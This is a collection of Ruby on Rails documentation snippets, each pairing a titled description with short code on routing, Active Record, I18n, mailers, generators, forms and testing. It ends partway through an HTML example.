TITLE: Switching Connections for Primary Database Cluster in Ruby on Rails
DESCRIPTION: Demonstrates how to switch connections only for the primary database cluster using ApplicationRecord, while leaving other database connections unchanged.

LANGUAGE: ruby
CODE:
ApplicationRecord.connected_to(role: :reading, shard: :shard_one) do
  Person.first # Reads from primary_shard_one_replica.
  Dog.first # Reads from animals_primary.
end

----------------------------------------

TITLE: Updating Records Using Attribute Assignment and Save in Rails
DESCRIPTION: Alternative approach to update a record by first assigning attributes and then calling save. This allows for multiple attribute changes before saving to the database.

LANGUAGE: irb
CODE:
store(dev)> product = Product.find(1)
store(dev)> product.name = "T-Shirt"
=> "T-Shirt"
store(dev)> product.save
  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/
  Product Update (0.2ms)  UPDATE "products" SET "name" = 'T-Shirt', "updated_at" = '2024-11-09 22:39:09.693548' WHERE "products"."id" = 1 /*application='Store'*/
  TRANSACTION (0.0ms)  COMMIT TRANSACTION /*application='Store'*/
=> true

----------------------------------------

TITLE: Checking for Existing Associations in Rails
DESCRIPTION: This snippet shows how to check if an associated object exists using the association.nil? method. This is useful for conditional logic based on the presence of an associated record.

LANGUAGE: ruby
CODE:
if @book.author.nil?
  @msg = "No author found for this book"
end

----------------------------------------

TITLE: Running the Named Initializer Generator
DESCRIPTION: Command to run the named initializer generator with an argument, and viewing the generated file content.

LANGUAGE: bash
CODE:
$ bin/rails generate initializer core_extensions
      create  config/initializers/core_extensions.rb

$ cat config/initializers/core_extensions.rb

----------------------------------------

TITLE: Default Scope Behavior After Rails 4.1
DESCRIPTION: Example of how default_scope works in Rails 4.1+, where conditions are merged rather than overridden, requiring explicit removal of default scope when needed.

LANGUAGE: ruby
CODE:
class User < ActiveRecord::Base
  default_scope { where state: "pending" }
  scope :active, -> { where state: "active" }
  scope :inactive, -> { where state: "inactive" }
end

User.all
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending'

User.active
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'active'

User.where(state: "inactive")
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'inactive'

----------------------------------------

TITLE: Shared Partial Caching Between Different MIME Types
DESCRIPTION: This code demonstrates how to implement shared partial caching between files with different MIME types. It allows the same partial to be used in both HTML and JavaScript responses.

LANGUAGE: ruby
CODE:
render(partial: "hotels/hotel", collection: @hotels, cached: true)

----------------------------------------

TITLE: Applying Shallow Option to Parent Resource in Rails Routing
DESCRIPTION: Demonstrates setting the :shallow option on the parent resource to make all nested resources shallow. This applies the shallow nesting pattern to all child resources simultaneously.

LANGUAGE: ruby
CODE:
resources :articles, shallow: true do
  resources :comments
  resources :quotes
end

----------------------------------------

TITLE: Creating Internationalized Email Subjects in Action Mailer
DESCRIPTION: Shows how to define an email mailer that uses internationalized subject lines from translation files instead of hardcoded subjects.

LANGUAGE: ruby
CODE:
# user_mailer.rb
class UserMailer < ActionMailer::Base
  def welcome(user)
    #...
  end
end

----------------------------------------

TITLE: Removing Middlewares from Rails Application Configuration
DESCRIPTION: Shows how to remove a middleware from the Rails middleware stack using the config.middleware.delete method. This example removes the Rack::Runtime middleware from the application.

LANGUAGE: ruby
CODE:
# config/application.rb
config.middleware.delete Rack::Runtime

----------------------------------------

TITLE: Demonstrating Stale Objects in Rails Console with reload!
DESCRIPTION: This IRB session demonstrates how calling reload! creates stale objects. When the User class is reloaded, instances created before the reload are instances of the original class, not the newly loaded one.

LANGUAGE: irb
CODE:
irb> joe = User.new
irb> reload!
irb> alice = User.new
irb> joe.class == alice.class
=> false

----------------------------------------

TITLE: Accessing Rails Database Console
DESCRIPTION: This command opens the Rails database console which allows direct interaction with the database.

LANGUAGE: irb
CODE:
rails dbconsole

----------------------------------------

TITLE: Using with_lock in ActiveRecord
DESCRIPTION: Demonstrates the new with_lock method which simplifies pessimistic locking by handling transaction and lock operations in a single method call.

LANGUAGE: ruby
CODE:
class Order < ActiveRecord::Base
  def cancel!
    with_lock do
      # ... cancelling logic
    end
  end
end

----------------------------------------

TITLE: Setting Up the Parent Channel Class in Rails Action Cable
DESCRIPTION: Basic setup of the ApplicationCable::Channel parent class. This serves as the base class for all channel-specific implementations, similar to how ApplicationController works for controllers in MVC architecture.

LANGUAGE: ruby
CODE:
# app/channels/application_cable/channel.rb
module ApplicationCable
  class Channel < ActionCable::Channel::Base
  end
end

----------------------------------------

TITLE: Running Git Commands with git Method
DESCRIPTION: Examples of running Git commands within the template using the git method with different syntaxes for git operations.

LANGUAGE: ruby
CODE:
git :init
git add: "."
git commit: "-a -m 'Initial commit'"

----------------------------------------

TITLE: Initializing a Model with Composite Primary Key for Form Building
DESCRIPTION: Shows how to find a Book record using a composite primary key before building a form.

LANGUAGE: ruby
CODE:
@book = Book.find([2, 25])
# => #<Book id: 25, title: "Some book", author_id: 2>

----------------------------------------

TITLE: Using Symbols with class_name in ActiveRecord Associations
DESCRIPTION: Example of using a symbol with the :class_name option for associations instead of a string. This provides a more consistent interface with other options like :foreign_key.

LANGUAGE: ruby
CODE:
has_many :clients, :class_name => :Client # Note that the symbol need to be capitalized

----------------------------------------

TITLE: Customizing Polymorphic Mapping with Resolve in Rails
DESCRIPTION: Demonstrates using the resolve method to customize polymorphic URL generation for models. This example makes a Basket model generate singular URLs instead of the default plural resource paths.

LANGUAGE: ruby
CODE:
resource :basket

resolve("Basket") { [:basket] }

----------------------------------------

TITLE: Rails 3.2 Test Environment Configuration
DESCRIPTION: Configuration setting for mass assignment protection that should be added to the test environment when upgrading to Rails 3.2.

LANGUAGE: ruby
CODE:
# Raise exception on mass assignment protection for Active Record models
config.active_record.mass_assignment_sanitizer = :strict

----------------------------------------

TITLE: Storing Translations in Ruby Hash Format
DESCRIPTION: Example of how to store translations in a Ruby Hash format with nested keys. The top level key represents the locale (:pt), followed by namespace keys.

LANGUAGE: ruby
CODE:
{
  pt: {
    foo: {
      bar: "baz"
    }
  }
}

----------------------------------------

TITLE: Setting Root Route in Rails
DESCRIPTION: Configures the root route of the application to render the Products index action when visiting the base URL of the application.

LANGUAGE: ruby
CODE:
root "products#index"

----------------------------------------

TITLE: Implementing determine_default_mailer Method in Action Mailer
DESCRIPTION: Example showing how Rails uses constantize to infer the mailer class from a test class name by removing the 'Test' suffix.

LANGUAGE: ruby
CODE:
def determine_default_mailer(name)
  name.delete_suffix("Test").constantize
rescue NameError => e
  raise NonInferrableMailerError.new(name)
end

----------------------------------------

TITLE: with_options for I18n Localization
DESCRIPTION: Demonstrates using with_options with I18n to group locale-dependent text in a mailer, avoiding repetition of locale and scope parameters.

LANGUAGE: ruby
CODE:
I18n.with_options locale: user.locale, scope: "newsletter" do |i18n|
  subject i18n.t :subject
  body    i18n.t :body, user_name: user.name
end

----------------------------------------

TITLE: Disabling Error Notifications Temporarily
DESCRIPTION: Using Rails.error.disable to temporarily prevent a specific subscriber from receiving error notifications for the duration of a block.

LANGUAGE: ruby
CODE:
Rails.error.disable(ErrorSubscriber) do
  1 + "1" # TypeError will not be reported via the ErrorSubscriber
end

----------------------------------------

TITLE: Setting Test Order to Sorted in Rails 5
DESCRIPTION: Rails 5 changes the default test order from :sorted to :random. This configuration option allows you to revert back to the sorted order in your test environment.

LANGUAGE: ruby
CODE:
# config/environments/test.rb
Rails.application.configure do
  config.active_support.test_order = :sorted
end

----------------------------------------

TITLE: Defining Routes with Query String Parameters in Rails
DESCRIPTION: Creates a route that handles query string parameters. These parameters will be available in the params hash alongside route segment parameters.

LANGUAGE: ruby
CODE:
get "photos/:id", to: "photos#show"

----------------------------------------

TITLE: Adding Video Elements with video_tag in Rails
DESCRIPTION: Shows how to use the video_tag helper to insert HTML5 video elements into Rails views. Demonstrates various HTML5 video options and how to include multiple video sources.

LANGUAGE: erb
CODE:
<%= video_tag "movie.ogg" %>

LANGUAGE: erb
CODE:
<video src="/videos/movie.ogg" />

LANGUAGE: erb
CODE:
<%= video_tag ["trailer.ogg", "movie.ogg"] %>

LANGUAGE: erb
CODE:
<video>
  <source src="/videos/trailer.ogg">
  <source src="/videos/movie.ogg">
</video>

----------------------------------------

TITLE: Creating a Basic Initializer Generator
DESCRIPTION: Simple generator class that creates an initializer file at config/initializers/initializer.rb. It inherits from Rails::Generators::Base and uses the create_file method.

LANGUAGE: ruby
CODE:
class InitializerGenerator < Rails::Generators::Base
  def create_initializer_file
    create_file "config/initializers/initializer.rb", <<~RUBY
      # Add initialization content here
    RUBY
  end
end

----------------------------------------

TITLE: Configuring Rails Middleware with Non-Reloadable Class
DESCRIPTION: Example of configuring Rails middleware during boot with a class that shouldn't be reloadable, as changes to the class wouldn't affect the already-configured middleware.

LANGUAGE: ruby
CODE:
config.middleware.use MyApp::Middleware::Foo

----------------------------------------

TITLE: Implementing Fragment Caching in Mailer Views
DESCRIPTION: Example of using fragment caching in an Action Mailer view, similar to application views. This can help improve performance when rendering complex email templates.

LANGUAGE: html+erb
CODE:
<% cache do %>
  <%= @company.name %>
<% end %>

----------------------------------------

TITLE: HTML Output of collection_checkboxes
DESCRIPTION: Shows the HTML output generated by the collection_checkboxes helper, including individual checkboxes with proper name, value, and id attributes along with their associated labels.

LANGUAGE: html
CODE:
<input type="checkbox" name="person[interest_id][]" value="3" id="person_interest_id_3">
<label for="person_interest_id_3">Engineering</label>

<input type="checkbox" name="person[interest_id][]" value="4" id="person_interest_id_4">
<label for="person_interest_id_4">Math</label>

<input type="checkbox" name="person[interest_id][]" value="1" id="person_interest_id_1">
<label for="person_interest_id_1">Science</label>

<input type="checkbox" name="person[interest_id][]" value="2" id="person_interest_id_2">
<label for="person_interest_id_2">Technology</label>

----------------------------------------

TITLE: Excluding Directories from Asset Pipeline
DESCRIPTION: Shows how to exclude specific directories from Propshaft's digestion process using configuration in Rails. This is useful when you want to use the directories for other purposes.

LANGUAGE: ruby
CODE:
config.assets.excluded_paths = [Rails.root.join("app/assets/stylesheets")]

----------------------------------------

TITLE: Using JSON Deserialization in Ruby IRB Console
DESCRIPTION: This example demonstrates how to use the from_json method to create a Person object from a JSON string. It shows the complete process from creating JSON to parsing it into an object.

LANGUAGE: ruby
CODE:
irb> json = { name: "Bob" }.to_json
=> "{\"name\":\"Bob\"}"

irb> person = Person.new

irb> person.from_json(json)
=> #<Person:0x00000100c773f0 @name="Bob">

irb> person.name
=> "Bob"

----------------------------------------

TITLE: Using scope to Create Path Prefixes without Namespaced Controllers in Rails
DESCRIPTION: Routes /admin/articles to ArticlesController without the Admin:: module prefix by using the scope path approach. This adds a path prefix while keeping the controllers in the default namespace.

LANGUAGE: ruby
CODE:
scope "/admin" do
  resources :articles
end

----------------------------------------

TITLE: Using HTML Safe Translations in ERB Templates
DESCRIPTION: Demonstrates how to use HTML safe translations in ERB templates, showing the difference between regular translations, raw translations, and HTML-safe marked translations.

LANGUAGE: html+erb
CODE:
<!-- app/views/home/index.html.erb -->
<div><%= t('welcome') %></div>
<div><%= raw t('welcome') %></div>
<div><%= t('hello_html') %></div>
<div><%= t('title.html') %></div>

----------------------------------------

TITLE: Renaming Default Route Parameter with :param Option in Rails
DESCRIPTION: Demonstrates how to rename the default 'id' parameter name with the :param option. This changes the parameter name used in controllers while maintaining the same routing structure.

LANGUAGE: ruby
CODE:
resources :videos, param: :identifier

----------------------------------------

TITLE: Specifying Class Names for Cross-Module Associations in Rails
DESCRIPTION: Demonstrates how to explicitly specify class names when creating associations between models in different namespaces.

LANGUAGE: ruby
CODE:
module MyApplication
  module Business
    class Supplier < ApplicationRecord
      has_one :account,
        class_name: "MyApplication::Billing::Account"
    end
  end

  module Billing
    class Account < ApplicationRecord
      belongs_to :supplier,
        class_name: "MyApplication::Business::Supplier"
    end
  end
end

----------------------------------------

TITLE: Creating Rake Tasks with rakefile Method
DESCRIPTION: Example of creating a new rake file under lib/tasks with custom rake tasks using the rakefile method.

LANGUAGE: ruby
CODE:
rakefile("bootstrap.rake") do
  <<-TASK
    namespace :boot do
      task :strap do
        puts "i like boots!"
      end
    end
  TASK
end

----------------------------------------

TITLE: Creating Associated Records with Default Composite Primary Key Behavior
DESCRIPTION: Shows how to create an Order with a composite primary key and an associated Book when Rails uses the default behavior.

LANGUAGE: ruby
CODE:
order = Order.create!(id: [1, 2], status: "pending")
book = order.books.create!(title: "A Cool Book")

----------------------------------------

TITLE: Using String#upcase_first in Ruby on Rails
DESCRIPTION: This method capitalizes the first letter of a string while leaving the rest unchanged. It's useful for formatting text where only the first character needs to be uppercase.

LANGUAGE: ruby
CODE:
"employee salary".upcase_first # => "Employee salary"
"".upcase_first                # => ""

----------------------------------------

TITLE: Creating Nested Forms with fields_for in Rails View
DESCRIPTION: This ERB template creates a form for a Customer model with nested fields for its orders. It demonstrates how to use fields_for to create nested forms and includes conditional logic for record deletion.

LANGUAGE: html+erb
CODE:
<% form_for @customer do |customer_form| %>
  <div>
    <%= customer_form.label :name, 'Customer Name:' %>
    <%= customer_form.text_field :name %>
  </div>

  <!-- Here we call fields_for on the customer_form builder instance.
   The block is called for each member of the orders collection. -->
  <% customer_form.fields_for :orders do |order_form| %>
    <p>
      <div>
        <%= order_form.label :number, 'Order Number:' %>
        <%= order_form.text_field :number %>
      </div>

  <!-- The allow_destroy option in the model enables deletion of
   child records. -->
      <% unless order_form.object.new_record? %>
        <div>
          <%= order_form.label :_delete, 'Remove:' %>
          <%= order_form.checkbox :_delete %>
        </div>
      <% end %>
    </p>
  <% end %>

  <%= customer_form.submit %>
<% end %>

----------------------------------------

TITLE: Using Interpolation in Internationalized Email Subjects
DESCRIPTION: Demonstrates how to use interpolation in internationalized email subjects by using the default_i18n_subject method in mailers.

LANGUAGE: ruby
CODE:
# user_mailer.rb
class UserMailer < ActionMailer::Base
  def welcome(user)
    mail(to: user.email, subject: default_i18n_subject(user: user.name))
  end
end

----------------------------------------

TITLE: Decoding Template Dependencies from Render Calls in Ruby
DESCRIPTION: Examples of render calls in templates that ActionView::Digestor can automatically decode for caching dependencies. These patterns are recognized and processed to determine template dependencies.

LANGUAGE: ruby
CODE:
render partial: "comments/comment", collection: commentable.comments
render "comments/comments"
render("comments/comments")

render "header" # translates to render("comments/header")

render(@topic)         # translates to render("topics/topic")
render(topics)         # translates to render("topics/topic")
render(message.topics) # translates to render("topics/topic")

----------------------------------------

TITLE: Basic ProductsController Implementation
DESCRIPTION: Shows the initial ProductsController class with an empty index action. Even with an empty action, Rails will render the corresponding view template.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
  end
end

----------------------------------------

TITLE: Using classify with Qualified Table Names in Ruby on Rails
DESCRIPTION: Example showing how classify handles qualified table names, extracting just the relevant part for conversion to a class name.

LANGUAGE: ruby
CODE:
"highrise_production.companies".classify # => "Company"

----------------------------------------

TITLE: Loading Active Support Minimal Dependencies in Ruby
DESCRIPTION: The basic way to require Active Support which loads only the minimum dependencies required by the framework.

LANGUAGE: ruby
CODE:
require "active_support"

----------------------------------------

TITLE: Declaring Delegated Type in Entry Model
DESCRIPTION: Example of declaring a delegated_type in the Entry model. This sets up the polymorphic relationship with Message and Comment models and specifies dependency behavior.

LANGUAGE: ruby
CODE:
class Entry < ApplicationRecord
  delegated_type :entryable, types: %w[ Message Comment ], dependent: :destroy
end

----------------------------------------

TITLE: Disabling I18n Locale Enforcement in Rails
DESCRIPTION: Configuration to disable the enforcement of available locales in I18n. This allows I18n to accept any locale but is not recommended for security reasons.

LANGUAGE: ruby
CODE:
config.i18n.enforce_available_locales = false

----------------------------------------

TITLE: Adding Notification Callbacks to Product Model
DESCRIPTION: Code to add callbacks and methods to the Product model for triggering in-stock notifications.

LANGUAGE: ruby
CODE:
class Product < ApplicationRecord
  has_one_attached :featured_image
  has_rich_text :description
  has_many :subscribers, dependent: :destroy

  validates :name, presence: true
  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }

  after_update_commit :notify_subscribers, if: :back_in_stock?

  def back_in_stock?
    inventory_count_previously_was.zero? && inventory_count > 0
  end

  def notify_subscribers
    subscribers.each do |subscriber|
      ProductMailer.with(product: self, subscriber: subscriber).in_stock.deliver_later
    end
  end
end

----------------------------------------

TITLE: Using an Instance Callback Class in a Model
DESCRIPTION: Shows how to use a callback class with instance methods in a model. The callback class needs to be instantiated when using instance methods as callbacks.

LANGUAGE: ruby
CODE:
class PictureFile < ApplicationRecord
  after_commit FileDestroyerCallback.new
end

----------------------------------------

TITLE: Running the Custom Initializer Generator
DESCRIPTION: Command to invoke the newly created initializer generator from the Rails application.

LANGUAGE: bash
CODE:
$ bin/rails generate initializer

----------------------------------------

TITLE: Jbuilder Output JSON Example
DESCRIPTION: The JSON output produced by the basic Jbuilder template example, showing the generated structure.

LANGUAGE: json
CODE:
{
  "name": "Alex",
  "email": "alex@example.com"
}

----------------------------------------

TITLE: Setting Up PostgreSQL User on macOS
DESCRIPTION: Command to create a PostgreSQL superuser that matches your system username on macOS. This is required for running Active Record tests with PostgreSQL.

LANGUAGE: bash
CODE:
$ createuser --superuser $USER

----------------------------------------

TITLE: Setting Locale from Top-Level Domain in Rails
DESCRIPTION: Demonstrates how to extract and set the locale based on the top-level domain of the request URL in a Rails application, with fallback to the default locale if the domain doesn't match an available locale.

LANGUAGE: ruby
CODE:
around_action :switch_locale

def switch_locale(&action)
  locale = extract_locale_from_tld || I18n.default_locale
  I18n.with_locale(locale, &action)
end

# Get locale from top-level domain or return +nil+ if such locale is not available
# You have to put something like:
#   127.0.0.1 application.com
#   127.0.0.1 application.it
#   127.0.0.1 application.pl
# in your /etc/hosts file to try this out locally
def extract_locale_from_tld
  parsed_locale = request.host.split(".").last
  I18n.available_locales.map(&:to_s).include?(parsed_locale) ? parsed_locale : nil
end

----------------------------------------

TITLE: Console Example of Callback Overriding
DESCRIPTION: IRB console example showing how with multiple callbacks using the same method name, only the last defined callback is executed. Create actions do not trigger the callback, only updates do.

LANGUAGE: ruby
CODE:
irb> user = User.create # prints nothing

irb> user.save # updating @user
User was saved to database

----------------------------------------

TITLE: Disabling SQLite3 Strict Strings Mode in Ruby
DESCRIPTION: Configuration to disable the default strict strings mode for SQLite3Adapter in Rails 7.1+. The strict mode prevents double-quoted string literals which can lead to silent issues in SQLite.

LANGUAGE: ruby
CODE:
# config/application.rb
config.active_record.sqlite3_adapter_strict_strings_by_default = false

----------------------------------------

TITLE: Generating and Destroying a Model
DESCRIPTION: Shows generating a model and then undoing it with the destroy command. This demonstrates how Rails can cleanly remove generated code and database artifacts.

LANGUAGE: bash
CODE:
$ bin/rails generate model Oops
      invoke  active_record
      create    db/migrate/20120528062523_create_oops.rb
      create    app/models/oops.rb
      invoke    test_unit
      create      test/models/oops_test.rb
      create      test/fixtures/oops.yml

LANGUAGE: bash
CODE:
$ bin/rails destroy model Oops
      invoke  active_record
      remove    db/migrate/20120528062523_create_oops.rb
      remove    app/models/oops.rb
      invoke    test_unit
      remove      test/models/oops_test.rb
      remove      test/fixtures/oops.yml

----------------------------------------

TITLE: Defining HTML Safe Translations with Interpolation
DESCRIPTION: Shows how to define translations with interpolation that are marked as HTML safe using the _html suffix in YAML configuration.

LANGUAGE: yaml
CODE:
en:
  welcome_html: "<b>Welcome %{username}!</b>"

----------------------------------------

TITLE: Running ActiveModel Lint Tests with Rails Command
DESCRIPTION: This example shows the command to run ActiveModel lint tests and a sample output of successful tests. It demonstrates using the Rails test runner to verify model compliance.

LANGUAGE: bash
CODE:
$ bin/rails test

Run options: --seed 14596

# Running:

......

Finished in 0.024899s, 240.9735 runs/s, 1204.8677 assertions/s.

6 runs, 30 assertions, 0 failures, 0 errors, 0 skips

----------------------------------------

TITLE: Generated HTML for Non-POST HTTP Methods
DESCRIPTION: Shows the HTML output generated when specifying a non-POST HTTP method. Rails adds a hidden _method field that allows the server to treat the request as the specified method.

LANGUAGE: html
CODE:
<form action="/search" accept-charset="UTF-8" method="post">
  <input type="hidden" name="_method" value="patch" autocomplete="off">
  <input type="hidden" name="authenticity_token" value="R4quRuXQAq75TyWpSf8AwRyLt-R1uMtPP1dHTTWJE5zbukiaY8poSTXxq3Z7uAjXfPHiKQDsWE1i2_-h0HSktQ" autocomplete="off">
<!-- ... -->
</form>

----------------------------------------

TITLE: Unsubscribing from Rails Error Reporter
DESCRIPTION: Methods to unsubscribe either a specific subscriber instance or all subscribers of a class from the Rails error reporter.

LANGUAGE: ruby
CODE:
subscriber = ErrorSubscriber.new
Rails.error.unsubscribe(subscriber)
# or
Rails.error.unsubscribe(ErrorSubscriber)

----------------------------------------

TITLE: Configuring Custom Foreign Keys in has_and_belongs_to_many Self-Join in Rails
DESCRIPTION: Demonstrates how to set up a many-to-many self-join relationship between User instances using :association_foreign_key and :foreign_key options to customize the join table columns.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  has_and_belongs_to_many :friends,
      class_name: "User",
      foreign_key: "this_user_id",
      association_foreign_key: "other_user_id"
end

----------------------------------------

TITLE: Running Tests for a Specific Directory in Rails
DESCRIPTION: Shows how to run tests for a specific directory within a Rails component. This example demonstrates running tests for the models directory in Active Storage.

LANGUAGE: bash
CODE:
$ cd activestorage
$ bin/test models

----------------------------------------

TITLE: Deep Merging of Nested Hashes in Rails
DESCRIPTION: Shows how to use deep_merge and deep_merge! to recursively merge nested hashes, preserving the structure and combining values at each level instead of overwriting entire nested hashes.

LANGUAGE: ruby
CODE:
{ a: { b: 1 } }.deep_merge(a: { c: 2 })
# => {:a=>{:b=>1, :c=>2}}

----------------------------------------

TITLE: Using assert_nothing_raised for Testing Exception Absence in Ruby
DESCRIPTION: Ensures that the given block doesn't raise any exceptions during execution.

LANGUAGE: ruby
CODE:
assert_nothing_raised { block }

----------------------------------------

TITLE: Sample Routes Output for Products Resource
DESCRIPTION: Displays the output of the routes command showing all RESTful routes generated by resources :products, including HTTP verbs, URI patterns and corresponding controller actions.

LANGUAGE: text
CODE:
                                  Prefix Verb   URI Pattern                                                                                       Controller#Action
                                products GET    /products(.:format)                                                                               products#index
                                         POST   /products(.:format)                                                                               products#create
                             new_product GET    /products/new(.:format)                                                                           products#new
                            edit_product GET    /products/:id/edit(.:format)                                                                      products#edit
                                 product GET    /products/:id(.:format)                                                                           products#show
                                         PATCH  /products/:id(.:format)                                                                           products#update
                                         PUT    /products/:id(.:format)                                                                           products#update
                                         DELETE /products/:id(.:format)                                                                           products#destroy

----------------------------------------

TITLE: Demonstrating String#classify Method in Ruby on Rails
DESCRIPTION: Examples showing how classify converts table names to class names, the inverse of tableize, useful for inferring model classes.

LANGUAGE: ruby
CODE:
"people".classify        # => "Person"
"invoices".classify      # => "Invoice"
"invoice_lines".classify # => "InvoiceLine"

----------------------------------------

TITLE: Running Rails Tests on Specific Methods
DESCRIPTION: Demonstrates how to run a specific test method using the -n or --name flag with the method name. Useful for focusing on a single failing test.

LANGUAGE: bash
CODE:
$ bin/rails test test/models/article_test.rb -n test_the_truth
Running 1 tests in a single process (parallelization threshold is 50)
Run options: -n test_the_truth --seed 43583

# Running:

.

Finished tests in 0.009064s, 110.3266 tests/s, 110.3266 assertions/s.

1 tests, 1 assertions, 0 failures, 0 errors, 0 skips

----------------------------------------

TITLE: Multiple Wildcard Segments in Rails Routes
DESCRIPTION: Demonstrates using multiple wildcard segments in a single route. Rails assigns segments to parameters in the order they occur, allowing for very flexible route patterns.

LANGUAGE: ruby
CODE:
get "*a/foo/*b", to: "test#index"

----------------------------------------

TITLE: Updating Main Plugin Module with Acts As Requirement
DESCRIPTION: Updated main plugin file that requires both core extension and acts_as_yaffle files. This shows how to organize and load multiple components in a plugin.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle.rb

require "yaffle/version"
require "yaffle/railtie"
require "yaffle/core_ext"
require "yaffle/acts_as_yaffle"

module Yaffle
  # Your code goes here...
end

----------------------------------------

TITLE: Enabling Unlogged Tables for PostgreSQL in Test Environment
DESCRIPTION: This example shows how to configure PostgreSQL to create unlogged tables in the test environment for improved performance, with a warning about the risk of data loss.

LANGUAGE: ruby
CODE:
# config/environments/test.rb

ActiveSupport.on_load(:active_record_postgresqladapter) do
  self.create_unlogged_tables = true
end

----------------------------------------

TITLE: Rendering ActiveModel Objects with ERB Partial
DESCRIPTION: This snippet demonstrates how to render an ActiveModel object with the render helper in an ERB template, showing how ActiveModel objects can be treated like Active Record objects in views.

LANGUAGE: html+erb
CODE:
<%= render @email_contact %>

----------------------------------------

TITLE: Formatting Capitalized Heading Examples in Rails Guides
DESCRIPTION: Demonstrates the proper capitalization rules for headings in Rails Guides, where all words are capitalized except prepositions, conjunctions, internal articles, and forms of the verb "to be".

LANGUAGE: markdown
CODE:
#### Assertions and Testing Jobs inside Components
#### Middleware Stack is an Array
#### When are Objects Saved?

----------------------------------------

TITLE: Configuring Generator Overrides in Rails Application
DESCRIPTION: Ruby configuration code that tells Rails to use a custom helper generator instead of the built-in one. This is added to config/application.rb to override the default generator behavior.

LANGUAGE: ruby
CODE:
config.generators do |g|
  g.helper :my_helper
end

----------------------------------------

TITLE: Scheduling a Job with Relative Time Delay in Rails
DESCRIPTION: Illustrates how to schedule a job to run after a specific time interval (1 week in this example) using the set method with wait parameter.

LANGUAGE: ruby
CODE:
# Enqueue a job to be performed 1 week from now.
GuestsCleanupJob.set(wait: 1.week).perform_later(guest)

----------------------------------------

TITLE: Shared Configuration in YAML
DESCRIPTION: Example of a YAML configuration file that uses the 'shared' section to define common configurations that will be merged with environment-specific settings.

LANGUAGE: yaml
CODE:
# config/example.yml
shared:
  foo:
    bar:
      baz: 1

development:
  foo:
    bar:
      qux: 2

----------------------------------------

TITLE: Bulk Deleting Records in Rails
DESCRIPTION: Demonstrates how to delete multiple records at once using the destroy_by method. This example finds and deletes all books by a specific author in one operation.

LANGUAGE: ruby
CODE:
# Find and delete all books by Douglas Adams.
Book.destroy_by(author: "Douglas Adams")

----------------------------------------

TITLE: Setting Up Locale-specific Pluralization Rules in Rails I18n
DESCRIPTION: Demonstrates how to include the Pluralization backend for locale-specific rules and define custom pluralization algorithms for a language (Portuguese in this example).

LANGUAGE: ruby
CODE:
I18n::Backend::Simple.include(I18n::Backend::Pluralization)
I18n.backend.store_translations :pt, i18n: { plural: { rule: lambda { |n| [0, 1].include?(n) ? :one : :other } } }
I18n.backend.store_translations :pt, apples: { one: "one or none", other: "more than one" }

I18n.t :apples, count: 0, locale: :pt
# => 'one or none'

----------------------------------------

TITLE: Migrating ImageMagick resize to Vips resize_to_limit in Rails
DESCRIPTION: Shows how to update Active Storage image transformation code from ImageMagick's resize syntax to libvips' resize_to_limit method, which requires array arguments instead of strings.

LANGUAGE: ruby
CODE:
- variant(resize: "100x")
+ variant(resize_to_limit: [100, nil])

----------------------------------------

TITLE: Configuring Custom Health Check Endpoint
DESCRIPTION: Demonstrates how to customize the built-in Rails health check endpoint path in routes.rb. This changes the default '/up' path to a custom path while maintaining the same health check functionality.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  get "health" => "rails/health#show", as: :rails_health_check
end

----------------------------------------

TITLE: Demonstrating Aborted Callbacks in IRB
DESCRIPTION: This IRB session shows what happens when a callback chain is aborted. When update is called on a Person object, only the reset_me method executes before aborting, and false is returned. No other callbacks or the update body are executed.

LANGUAGE: ruby
CODE:
irb> person = Person.new

irb> person.update
reset_me method: called before the update method
=> false

----------------------------------------

TITLE: Counting Grouped Items in ActiveRecord
DESCRIPTION: Shows how to use the 'count' method with 'group' to get totals for grouped items in a single query, returning a hash of results.

LANGUAGE: ruby
CODE:
irb> Order.group(:status).count
=> {"being_packed"=>7, "shipped"=>12}

LANGUAGE: sql
CODE:
SELECT COUNT (*) AS count_all, status AS status
FROM orders
GROUP BY status

----------------------------------------

TITLE: Using Multiple Submit Buttons with Different HTTP Methods
DESCRIPTION: Demonstrates using buttons with different formmethod attributes to trigger different HTTP methods in the same form. This allows having update and delete actions in one form.

LANGUAGE: erb
CODE:
<%= form_with url: "/posts/1", method: :patch do |form| %>
  <%= form.button "Delete", formmethod: :delete, data: { confirm: "Are you sure?" } %>
  <%= form.button "Update" %>
<% end %>

----------------------------------------

TITLE: Cache Delete Example Payload in Active Support
DESCRIPTION: Example of the payload data available during a cache_delete.active_support event. This shows the cache key and store class name.

LANGUAGE: ruby
CODE:
{
  key: "name-of-complicated-computation",
  store: "ActiveSupport::Cache::MemCacheStore"
}

----------------------------------------

TITLE: Customizing Asset Pipeline Prefix
DESCRIPTION: Changes the default asset prefix path to avoid conflicts with existing /assets routes in the application.

LANGUAGE: ruby
CODE:
# Defaults to '/assets'
config.assets.prefix = "/asset-files"

----------------------------------------

TITLE: Default Database Transaction Behavior in Rails Tests
DESCRIPTION: Shows how Rails automatically wraps tests in database transactions that are rolled back after completion, making tests independent of each other.

LANGUAGE: ruby
CODE:
class MyTest < ActiveSupport::TestCase
  test "newly created users are active by default" do
    # Since the test is implicitly wrapped in a database transaction, the user
    # created here won't be seen by other tests.
    assert User.create.active?
  end
end

----------------------------------------

TITLE: Implementing a Controller Action in Ruby
DESCRIPTION: Shows how to modify the generated controller to add functionality. This example adds a message instance variable that will be displayed in the view.

LANGUAGE: ruby
CODE:
class GreetingsController < ApplicationController
  def hello
    @message = "Hello, how are you today?"
  end
end

----------------------------------------

TITLE: Demonstrating PostgreSQL Date Column Decoding in Rails
DESCRIPTION: This code shows how PostgresqlAdapter can decode date columns when the config.active_record.postgresql_adapter_decode_dates option is enabled. It returns a Date object instead of a string.

LANGUAGE: ruby
CODE:
ActiveRecord::Base.connection
     .select_value("select '2024-01-01'::date").class #=> Date

----------------------------------------

TITLE: HTML Output for date_select Helper
DESCRIPTION: The HTML output generated by the date_select helper, showing the separate select boxes for year, month, and day. The options corresponding to the model's birth_date attribute are automatically selected.

LANGUAGE: html
CODE:
<select name="person[birth_date(1i)]" id="person_birth_date_1i">
  <option value="1990">1990</option>
